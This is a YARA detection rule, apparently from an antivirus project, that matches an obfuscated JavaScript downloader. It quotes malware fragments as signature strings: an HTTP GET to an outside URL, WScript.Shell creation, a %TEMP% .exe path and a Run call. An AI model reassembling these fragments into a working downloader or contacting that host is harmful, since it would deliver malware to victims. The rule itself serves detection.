rule sig_20160401_1ac2e5e66e15c5db22367cdaa16204bc {
  meta:
    description = "datamaliciousorder - file 20160401_1ac2e5e66e15c5db22367cdaa16204bc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "245eb7f961b42815bff1c251f80c6f777737612685fbacf40269ebf436069269"

  strings:
    $s1  = "OiOg[AkOx](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/p2iskd\", false);" fullword ascii
    $s2  = "var WthRcn = function HamHl() {return WScript[NzgMau](\"WScript\"+\".Shell\");}(), OdbHpj = 11;" fullword ascii
    $s3  = "function KihXk(SmvUni, PiXb){ZpMen = ZpMen * 1; return SmvUni - PiXb;};" fullword ascii
    $s4  = "if (OiOg[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function TaLnu(){return LnRup + \"\";};" fullword ascii
    $s6  = "function QlaHr() {return WthRcn[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"snWV0AJ52mj.ex\" + \"e\";};" fullword ascii
    $s7  = "function ZagPl() {return ((AbLgt == true) && (AbLgt == XfUth)) ? 1 : ZpMen;};" fullword ascii
    $s8  = "var XfUth = false;" fullword ascii
    $s9  = "AbLgt = true; " fullword ascii
    $s10 = "function UmyOo(CsmTd) {var BbtFz = (1, 2, 3, 4, 5, CsmTd); return BbtFz;};" fullword ascii
    $s11 = "function XznUy(){return 23;};" fullword ascii
    $s12 = "var HwTf = false;" fullword ascii
    $s13 = "function ZwhDsn()" fullword ascii
    $s14 = "function InJaj(AuQjg){WthRcn[\"R\"+\"un\"](AuQjg, ZpMen, ZpMen);};" fullword ascii
    $s15 = "var AbLgt = false;" fullword ascii
    $s16 = "return KihXk(XmUu, FjBa);" fullword ascii
    $s17 = "var TzwXm = new this[\"Date\"]();" fullword ascii
    $s18 = "}while (SxnUl);" fullword ascii
    $s19 = "XfUth = true; " fullword ascii
    $s20 = "function IsXd(){return NzgMau;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}